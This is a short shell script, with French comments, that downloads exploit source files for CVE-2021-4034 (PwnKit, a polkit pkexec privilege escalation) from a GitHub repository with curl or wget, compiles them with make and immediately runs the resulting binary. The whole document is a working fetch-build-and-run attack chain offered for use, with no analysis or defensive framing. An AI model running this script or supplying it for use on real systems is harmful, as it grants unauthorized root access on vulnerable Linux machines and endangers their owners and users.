#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "$(basename "$EXPLOIT")"
done

# Vérification si les fichiers ont été téléchargés
if [ ! -f "cve-2021-4034.c" ] || [ ! -f "pwnkit.c" ] || [ ! -f "Makefile" ]; then
    echo "Erreur: Échec du téléchargement d'un ou plusieurs fichiers."
    exit 1
fi

make

if [ $? -eq 0 ]; then
    ./cve-2021-4034
else
    echo "Erreur: La compilation a échoué."
    exit 1
fi